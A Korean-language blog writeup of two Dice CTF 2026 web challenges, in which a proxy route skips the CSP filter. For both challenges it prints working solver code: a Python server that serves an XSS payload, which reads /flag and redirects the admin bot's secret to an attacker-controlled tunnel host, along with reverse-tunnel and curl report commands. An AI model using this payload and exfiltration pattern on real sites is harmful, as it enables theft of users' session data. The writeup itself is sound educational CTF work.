---
title: "[Web] mirror-temple/b-side"
description: Writeup for "mirror-temple/b-side" from Dice CTF 2026.
date: 2026-03-11 09:00:00 +0900
categories: [CTF, Dice CTF 2026]
tags: [Web]
toc: true
comments: false
---

# mirror-temple (Dice CTF 2026)

---

- **Name:** mirror-temple/b-side
- **Category:** Web
- **Difficulty:** ★☆☆☆☆ (112 points, solving 193 out of 497 teams)

---

## 개요

Spring Boot (Kotlin) 기반의 웹 앱입니다.
Admin bot이 쿠키에 **실제 flag**를 담고 있고,
Admin bot이 방문하는 URL에서 JS를 실행시켜
`fetch('/flag')`로 flag를 탈취하는 전형적인 XSS 문제처럼 보입니다.
하지만 CSP가 설정되어 있어서, 어떻게 JS를 실행시킬지가 핵심입니다.

---

## 앱 구조 분석

제공된 소스코드를 살펴보면, 엔드포인트 구성은 단순합니다.

| 엔드포인트 | 설명 |
|---|---|
| `GET /postcard-from-nyc` | 폼 입력 페이지 |
| `POST /postcard-from-nyc` | JWT 쿠키 저장 후 리다이렉트 |
| `GET /flag` | JWT 쿠키에 저장된 flag 반환 |
| `GET /proxy?url=URL` | 외부 URL 프록시 (Charon) |
| `POST /report` | Admin bot이 URL 방문 |

Admin bot의 동작 흐름(`admin.mjs`)은 이렇습니다.

```
1. localhost:8080/postcard-from-nyc 방문
2. flag: 실제 /flag.txt 내용 입력 → JWT 쿠키 저장
3. /report 로 신고된 URL 방문 (10초 대기)
```

목표는 단순합니다.
Admin bot의 `localhost:8080` 도메인에서 JS가 실행되면,
`fetch('/flag')`로 flag를 읽을 수 있습니다.

---

## CSP 확인

당연히 CSP가 있습니다. `SecurityTMFilter`를 살펴봅니다.

```kotlin
@Component
@Order(Ordered.LOWEST_PRECEDENCE)  // ← 가장 낮은 우선순위
class SecurityTMFilter : OncePerRequestFilter() {
    override fun doFilterInternal(...) {
        response.setHeader("Content-Security-Policy",
            """
            default-src 'none';
            script-src * 'sha256-BoCRi...vgok=';
            connect-src 'self';
            img-src 'self';
            style-src 'self';
            frame-src 'self';
            frame-ancestors 'self';
            """)
        filterChain.doFilter(request, response)
    }
}
```

`script-src *`이므로 외부 스크립트는 자유롭게 로드할 수 있습니다.
그런데 `connect-src 'self'`가 문제입니다.
JS를 실행해도 외부 서버로 `fetch()`를 쏠 수가 없습니다.

---

## 취약점 발견: Charon 라이브러리

`/proxy` 엔드포인트는 Charon 라이브러리가 처리합니다.
`CharonConfiguration`을 봅니다.

```kotlin
// /proxy?url=URL 요청을 Charon이 가로채서
// 외부 URL로 직접 요청 후 응답 반환
// → filterChain.doFilter() 를 호출하지 않음!
```

이 한 줄이 핵심입니다.
Charon은 요청을 받으면 응답을 **직접 완료**하고 돌아옵니다.
`filterChain.doFilter()`를 호출하지 않으니,
그 아래 필터인 `SecurityTMFilter`는 실행될 기회가 없습니다.

Spring 필터 체인 순서를 정리하면 이렇습니다.

```
[일반 요청]
JwtAuthFilter
  → SecurityTMFilter (CSP 헤더 적용 ✅)
  → Controller

[/proxy 요청]
JwtAuthFilter
  → Charon이 가로채서 바로 응답 완료
  → SecurityTMFilter 실행 안 됨 ❌
  → CSP 헤더 없음!
```

`@Order(Ordered.LOWEST_PRECEDENCE)`로 가장 나중에 실행되는
`SecurityTMFilter`는, Charon이 먼저 응답을 끝내버리면 실행될 방법이 없습니다.

즉, `/proxy?url=우리서버/evil.html`로 반환된 HTML에는 **CSP가 전혀 없습니다.**

---

## 남은 문제: 데이터 반출

CSP 없이 JS 실행은 가능해졌습니다.
그런데 flag를 외부로 꺼내야 합니다.

`fetch('https://우리서버/...')`는 CSP가 없어도
CTF 인프라 단에서 외부 요청이 차단될 수 있어 불안정합니다.

더 확실한 방법은 `window.location` 리다이렉트입니다.

```js
fetch('/flag')
  .then(r => r.text())
  .then(f => {
    window.location =
      'https://우리서버/got?f=' + encodeURIComponent(f)
  })
```

`window.location`을 통한 페이지 이동은 `navigate-to` 정책의 영향을 받는데,
이 문제의 CSP에는 `navigate-to` 지시문이 없습니다.
설령 CSP가 있어도 차단되지 않습니다.

---

## Exploit 전략

공격 흐름은 이렇습니다.

```
① 공격자가 POST /report 전송
   url = localhost:8080/proxy?url=MY/evil.html

② Admin bot이 localhost:8080에서 flag 쿠키 발급

③ Admin bot이 /proxy?url=MY/evil.html 방문
   → /proxy 응답에 CSP 없음!

④ evil.html의 JS가 실행됨
   → fetch('/flag') 로 flag 탈취

⑤ window.location으로 공격자 서버에 flag 전달
   → /got?f=dice{...}
```

중요한 포인트가 하나 있습니다.

Admin bot을 **외부 도메인으로 바로 유도하면 안 됩니다.**
Admin bot의 쿠키는 `localhost:8080` 도메인에 묶여 있기 때문입니다.
반드시 `http://localhost:8080/proxy?url=...` 형태로 신고해야,
Admin bot이 자신의 쿠키를 가진 채로 페이로드를 실행합니다.

---

## Exploit 실행 과정

**Step 1 — 외부 서버 구축 및 터널 오픈**

```python
# server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

MY = "https://<터널URL>"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/evil.html':
            payload = f"""<script>
fetch('/flag').then(r=>r.text()).then(f=>{{
  window.location = '{MY}/got?f=' + encodeURIComponent(f)
}})
</script>""".encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(payload)
        elif parsed.path == '/got':
            flag = parse_qs(
                urlparse(self.path).query
            ).get('f', [''])[0]
            print(f"\n🚩 FLAG: {flag}\n")
            self.send_response(200)
            self.end_headers()
    def log_message(self, f, *a):
        print(f"[REQ] {self.path}")

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

```bash
# 터미널 1: 서버 실행
python3 server.py

# 터미널 2: SSH 터널 (ngrok 없이 외부 노출)
ssh -R 80:localhost:8888 nokey@localhost.run
# → https://xxxx.lhr.life URL 발급됨
```

**Step 2 — 쿠키 발급 및 report 전송**

```bash
CTF="https://mirror-temple-<ID>.ctfi.ng"
MY="https://xxxx.lhr.life"

# 내 쿠키 발급
curl -c ~/cookies.txt \
  -X POST "$CTF/postcard-from-nyc" \
  -d "name=hacker&portrait=&flag=dice%7Btest%7D"

# report 전송 — localhost:8080 경유가 핵심!
curl -b ~/cookies.txt \
  -X POST "$CTF/report" \
  --data-urlencode \
  "url=http://localhost:8080/proxy?url=$MY/evil.html"
```

**Step 3 — Flag 수신**

```
[서버 로그]
[REQ] /evil.html
🚩 FLAG: dice{evila_si_rorrim_...}
[REQ] /got?f=dice{evila_si_rorrim_...}
```

---

## Solver

```python
# server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

MY = "https://<YOUR_TUNNEL_URL>"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/evil.html':
            payload = f"""<script>
fetch('/flag').then(r=>r.text()).then(f=>{{
  window.location = '{MY}/got?f=' + encodeURIComponent(f)
}})
</script>""".encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(payload)
        elif parsed.path == '/got':
            flag = parse_qs(
                urlparse(self.path).query
            ).get('f', [''])[0]
            print(f"\n🚩 FLAG: {flag}\n")
            self.send_response(200)
            self.end_headers()
    def log_message(self, f, *a):
        print(f"[REQ] {self.path}")

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

```bash
#!/bin/bash
CTF="https://mirror-temple-<ID>.ctfi.ng"
MY="https://<YOUR_TUNNEL_URL>"

curl -c /tmp/cookies.txt \
  -X POST "$CTF/postcard-from-nyc" \
  -d "name=hacker&portrait=&flag=dice%7Btest%7D"

curl -b /tmp/cookies.txt \
  -X POST "$CTF/report" \
  --data-urlencode \
  "url=http://localhost:8080/proxy?url=$MY/evil.html"
```

---

## FLAG

```
dice{evila_si_rorrim_eht_dna_gnikooc_si_tnega_
     eht_evif_si_emit_eht_krad_si_moor_eht}
```

> 🪞 뒤집으면:
> *"the room is dark the time is five
> the agent is cooking and the mirror is alive"*

---

## 요약

이 문제의 핵심은 **필터 체인의 우선순위 충돌**입니다.

**1. Charon 라이브러리의 필터 체인 우회**

`/proxy` 요청은 Charon이 `filterChain.doFilter()`를 호출하지 않고
직접 응답을 완료합니다.
`@Order(Ordered.LOWEST_PRECEDENCE)`로 가장 나중에 실행되는
`SecurityTMFilter`는 실행될 기회를 잃고,
`/proxy` 응답에는 CSP 헤더가 붙지 않습니다.

**2. window.location을 통한 데이터 반출**

`connect-src 'self'` 제한을 우회하기 위해
`fetch()` 대신 `window.location` 리다이렉트를 사용합니다.
CSP에 `navigate-to` 지시문이 없으면
외부 URL로의 이동은 막히지 않습니다.

*"stare long enough at the void and the void stares back"*
— 충분히 들여다보면 필터 체인 뒤에 숨겨진 공백이 보입니다.


---

# mirror-temple-b-side (Dice CTF 2026)

---

- **Name:** mirror-temple-b-side
- **Category:** Web
- **Description:** ‮okay the void stared back this surely can't be canon
- **Difficulty:** ★☆☆☆☆ (113 points, solving 183 out of 497 teams)

---

## 개요

mirror-temple의 후속 문제입니다.
구조는 완전히 동일하지만, CSP가 강화되었습니다.
"b-side"라는 이름처럼, 같은 곡을 다른 버전으로 부르는 느낌입니다.
CSP 강화가 실제로 공격을 막는지,
아니면 근본 취약점은 그대로인지를 파악하는 것이 핵심입니다.

---

## mirror-temple 과의 차이점 파악

소스코드에서 `SecurityTMFilter`의 CSP 설정을 비교합니다.

| 항목 | mirror-temple | b-side |
|---|---|---|
| `script-src` | `*` 와일드카드 | sha384 해시 3개만 |
| `frame-src` | `'self'` | `'none'` |
| `frame-ancestors` | `'self'` | `'none'` |
| script integrity | 없음 | 해시 있음 |

**b-side의 강화된 CSP:**

```
script-src
  'sha384-eX8v58WIlu...SCrpYJFr'
  'sha384-dBNCwXkkll...3tu7EuA'
  'sha384-ZRKYEXtLBV...uiB6CL';
```

인라인 스크립트도, 외부 스크립트도 해시가 정확히 일치하지 않으면 전부 차단됩니다.
mirror-temple에서 통했던 "외부 스크립트 로드" 방식은 더 이상 불가능합니다.

---

## 취약점 재확인: 근본 원인

CSP가 강화되었지만, 진짜 질문은 이것입니다.

**`/proxy` 엔드포인트에 CSP가 적용되는가?**

`SecurityTMFilter`는 여전히 `@Order(Ordered.LOWEST_PRECEDENCE)`로 등록되어 있습니다.
Charon 라이브러리가 `/proxy` 요청을 가로채서
`filterChain.doFilter()`를 호출하지 않는 구조도 그대로입니다.

```
[/proxy 요청]
JwtAuthFilter
  → Charon이 가로채서 바로 응답 완료
  → SecurityTMFilter 실행 안 됨 ❌
  → CSP 헤더 없음!
```

아무리 강력한 CSP를 `SecurityTMFilter`에 설정해도,
해당 필터가 실행되지 않으면 응답 헤더에 포함되지 않습니다.

```
/proxy 응답 헤더 (실제):
  Content-Type: text/html
  ← Content-Security-Policy 헤더 없음!

브라우저: "CSP 없네? 모든 스크립트 실행 허용!"
```

강화된 CSP는 일반 페이지에만 적용됩니다.
**`/proxy`로 서빙된 콘텐츠에는 여전히 CSP가 없습니다.**
exploit 방식은 mirror-temple과 완전히 동일합니다.

---

## Exploit 전략

공격 흐름은 mirror-temple과 동일합니다.

```
① 공격자가 POST /report 전송
   url = localhost:8080/proxy?url=MY/evil.html

② Admin bot이 localhost:8080에서 flag 쿠키 발급

③ Admin bot이 /proxy?url=MY/evil.html 방문
   → /proxy 응답에 CSP 없음!

④ evil.html의 JS가 실행됨
   → fetch('/flag') 로 flag 탈취

⑤ window.location으로 공격자 서버에 flag 전달
   → /got?f=dice{...}
```

---

## Exploit 실행 과정

**Step 1 — 외부 서버 구축 및 터널 오픈**

```python
# server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

MY = "https://<터널URL>"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/evil.html':
            payload = f"""<script>
fetch('/flag').then(r=>r.text()).then(f=>{{
  window.location = '{MY}/got?f=' + encodeURIComponent(f)
}})
</script>""".encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(payload)
        elif parsed.path == '/got':
            flag = parse_qs(
                urlparse(self.path).query
            ).get('f', [''])[0]
            print(f"\n🚩 FLAG: {flag}\n")
            self.send_response(200)
            self.end_headers()
    def log_message(self, f, *a):
        print(f"[REQ] {self.path}")

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

```bash
# 터미널 1: 서버 실행
python3 server.py

# 터미널 2: SSH 터널
ssh -R 80:localhost:8888 nokey@localhost.run
# → https://xxxx.lhr.life URL 발급됨
```

**Step 2 — 쿠키 발급 및 report 전송**

```bash
CTF="https://mirror-temple-b-side-<ID>.ctfi.ng"
MY="https://xxxx.lhr.life"

# 내 쿠키 발급
curl -c ~/cookies.txt \
  -X POST "$CTF/postcard-from-nyc" \
  -d "name=hacker&portrait=&flag=dice%7Btest%7D"

# report 전송 — localhost:8080 경유가 핵심!
curl -b ~/cookies.txt \
  -X POST "$CTF/report" \
  --data-urlencode \
  "url=http://localhost:8080/proxy?url=$MY/evil.html"
```

> ⚠️ **포인트:** Admin bot의 쿠키는 `localhost:8080` 도메인에 묶여 있어서,
> 외부 도메인으로 바로 유도하면 쿠키가 전송되지 않습니다.

**Step 3 — Flag 수신**

```
[서버 로그]
[REQ] /evil.html
🚩 FLAG: dice{neves_xis_cixot_...}
[REQ] /got?f=dice{neves_xis_cixot_...}
```

---

## Solver

```python
# server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

MY = "https://<YOUR_TUNNEL_URL>"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/evil.html':
            payload = f"""<script>
fetch('/flag').then(r=>r.text()).then(f=>{{
  window.location = '{MY}/got?f=' + encodeURIComponent(f)
}})
</script>""".encode()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(payload)
        elif parsed.path == '/got':
            flag = parse_qs(
                urlparse(self.path).query
            ).get('f', [''])[0]
            print(f"\n🚩 FLAG: {flag}\n")
            self.send_response(200)
            self.end_headers()
    def log_message(self, f, *a):
        print(f"[REQ] {self.path}")

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

```bash
#!/bin/bash
CTF="https://mirror-temple-b-side-<ID>.ctfi.ng"
MY="https://<YOUR_TUNNEL_URL>"

curl -c /tmp/cookies.txt \
  -X POST "$CTF/postcard-from-nyc" \
  -d "name=hacker&portrait=&flag=dice%7Btest%7D"

curl -b /tmp/cookies.txt \
  -X POST "$CTF/report" \
  --data-urlencode \
  "url=http://localhost:8080/proxy?url=$MY/evil.html"
```

---

## FLAG

```
dice{neves_xis_cixot_eb_ot_tey_hguone_gnol_galf_siht_si_
syawyna_ijome_lluks_eseehc_eht_rof_llef_dna_part_eht_
togrof_i_derit_os_saw_i_galf_siht_gnitirw_fo_sa_sruoh_
42_rof_ekawa_neeb_evah_i_tcaf_nuf}
```

> 😅🪞 뒤집으면:
> *"fun fact i have been awake for 42 hours as of writing this flag
> i was so tired i forgot the trap and fell for the cheese skulls emoji
> anyway this flag is long enough yet to be toxic six seven"*

---

## 요약

이 문제의 핵심은 **강화된 CSP가 진짜 취약점을 가리지 못한다**는 것입니다.

**1. 근본 취약점의 위치**

CSP는 `SecurityTMFilter`가 응답 헤더에 추가합니다.
하지만 Charon이 `/proxy` 요청을 필터 체인 중간에서 가로채면,
`SecurityTMFilter` 자체가 실행되지 않습니다.
CSP를 아무리 강화해도, 해당 필터가 실행되지 않는 경로에서는 의미가 없습니다.

**2. 패치 방법이 아닌 근본 원인을 찾아야 한다**

`script-src *`를 강력한 해시 기반 정책으로 바꾸면 CSP는 강화되지만,
취약점의 근본인 "Charon이 필터 체인을 우회한다"는 사실은 변하지 않습니다.
진짜 패치는 Charon 이전에 CSP를 설정하거나,
Charon 설정에서 응답 헤더를 직접 추가하는 것입니다.

*"okay the void did started back this surely can't be canon"*
— 강화된 CSP가 공허함을 메워줄 것 같지만,
공허함의 위치가 달라지지 않으면 뒤집어도 같은 문장입니다.

